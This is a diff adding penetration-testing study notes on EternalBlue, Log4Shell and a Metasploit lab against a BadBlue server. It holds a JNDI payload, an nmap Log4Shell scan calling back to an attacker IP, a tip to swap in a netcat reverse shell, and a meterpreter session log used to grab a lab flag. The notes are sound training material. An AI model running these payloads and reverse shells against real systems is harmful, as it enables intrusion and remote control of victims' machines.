@@ -74,6 +74,9 @@
   - [Case studies](#6.3)
     - [Heartbleed](#6.3.1)
     - [EternalBlue](#6.3.2)
+    - [Log4Shell](#6.3.3)
+  - [Nessus](#6.4)
+  - [Vulnerability Assessment](#6.5)
 
 
 <a id="1"></a>
@@ -1293,4 +1296,125 @@ The anatomy of the attack is as follows:
 <a id="6.3.2"></a>
 ### EternalBlue (MS17-010)
 
-EternalBlue is a vulnerability that affects SMBv1 from Windows Vista upto Windows Server 2016.
+EternalBlue is a vulnerability that affects SMBv1 from Windows Vista up to Windows Server 2016.
+Technically, it should also affect any unpatched version of the SMBv1 protoocl.
+
+The vulnerability exploit three different bugs:
+- Wrong casting bug: A bug in the process of converting FEA (File Extended Attributes) from Os2 
+structure to NT structure by the Windows SMB implementation (srv.sys driver) leads to buffer overflow 
+in the non-paged kernel pool.
+
+- Too complex to explain in few words. Check the paper linked below.
+
+- There is a bug that lets you allocate a chunk with a specified size in the kernel non-paged pool with 
+the specified size. It is used in the heap grooming phase when creating a hole that later will be filled 
+with a data size that causes an out of bound write to the next chunk (Bug A & Bug B).
+
+[Source: Checkpoint](https://research.checkpoint.com/2017/eternalblue-everything-know/). Very in-depth research on the matter. Good for those who want to learn 
+and understand.
+
+EternalBlue is famous due to it's usage on the ransomware WannaCry released around 2017. 
+
+We can search for this vulnerability using NSE scripts.
+
+```bash
+$ nmap --script vuln-ms17-010 [TARGET] # MS17-010 it's the internal vulnerability numbering system Microsoft uses.
+```
+
+The anatomy of the attack goes like this:
+
+1. Send a specially crafted malicious payload to the SMB server.
+2. Depending on the payload, you might get a reverse shell or something else.
+
+<a id="6.3.3"></a>
+### Log4shell (Log4J)
+
+Log4J is a common library that's used for logins in Java. It exploits a mishandling of JNDI and LDAP queries.
+
+Install the NSE script from GitHub.
+
+```bash
+$ mkdir -p $HOME/.nmap/scripts 
+$ git clone https://github.com/giterlizzi/nmap-log4shell && cp nmap-log4shell/log4shell.nse $HOME/.nmap/scripts && rm -rf nmap-log4shell
+$ nc -nlvp [PORT]
+$ nmap --script lo4shell --script-args log4shell.callback-server=[ATTACKER IP]:[ATTACKER PORT] [TARGET]
+```
+
+The anatomy of the attack goes like this:
+
+1. The attacker sends a malicious payload 
+  - Similar to this: ${jndi:ldap://our_ldap_server/my_code}.
+2. It mishandles the request and it evaluates the code.
+3. Since the payload is between curly braces and it starts with a dollar sign, it thinks it's a 
+variable. So, it connects to the LDAP server to find the "my_code" code.
+4. It then executes the class "my_code". It can be whatever the attacker wants (as long as its inside
+the servers permission to run).
+
+An instance of "my_code" can be like [this](https://github.com/snyk-labs/java-goof/blob/main/log4shell-goof/log4shell-server/src/main/java/Evil.java). 
+This code is benign. It doesn't establish anything serious like a reverse shell or an SQL dump. It just
+creates a file with the content "PWNED". nevertheless, it can be malicious. Change the "echo" with something 
+like a `nc [ATTACKERS IP] [ATTACKERS PORT]` and you'll have a reverse shell. Although in most cases, a Python
+one-lines will work better than a Netcat session, since people have realized that having Netcat is a good thing 
+for LOTL experts.
+
+<a id=6.4></a>
+## Nessus
+
+*By some reason, the Nessus section of the course is after this entire chapter. I know how to use Nessus, so it's not a problem for me. nevertheless, if you don't know how to use Nessus, wait for the next chapter. I'll update this file whenever I've started the auditing course.* 
+
+<a id=6.5></a>
+## Vulnerability Assessment
+
+Do a Nmap scan. Check the services versions, google them, find something like an exploit on Exploit-db and become a skiddie. 
+Just kidding. Read the exploits, don't just use them. Improve upon them. Be better.
+
+For later: I'd like to write a script based upon the [VSFTPD smiley face vulnerability](https://github.com/penkit/site/blob/master/guides/vsftpd-backdoor.md)
+because, since I don't have a lot of expertise writing exploits or more "complex" scripts, I think a vulnerability 
+of this ~~easiness to exploit~~  simplicity would be a good place to start.
+
+### Windows: Easy File Sharing Server Lab
+
+Objective: exploit the server and retrieve the flag.
+
+```bash
+$ nmap -sV $target
+80/tcp    open  http           BadBlue httpd 2.7
+# BadBlue is an old file sharing program. It's out of development and vulnerable to a lot of attacks. Let's try to exploit it.
+$ msfconsole
+msf5 > use use exploit/windows/http/badblue_passthru
+msf5 exploit > options
+Module options (exploit/windows/http/badblue_passthru):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+msf5 exploit > set RHOST $target
+msf5 exploit > set RPORT 80
+msf5 exploit > use payload windows/meterpreter/reverse_tcp
+msf5 exploit > exploit
+
+[*] Started reverse TCP handler on 10.10.80.5:4444 
+[*] Trying target BadBlue EE 2.7 Universal...
+[*] Sending stage (180291 bytes) to 10.4.20.250
+[*] Meterpreter session 2 opened (10.10.80.5:4444 -> 10.4.20.250:49257) at 2023-08-07 20:56:44 +0530
+
+meterpreter > shell
+Process 500 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\BadBlue\EE>echo pwned!!!
+echo pwned!!!
+pwned!!!
+C:\Program Files (x86)\BadBlue\EE>cd C:\
+C:\>dir
+09/16/2020  09:01 AM                32 flag.txt
+C.\>type flag.txt
+```
+
+We're good to go!
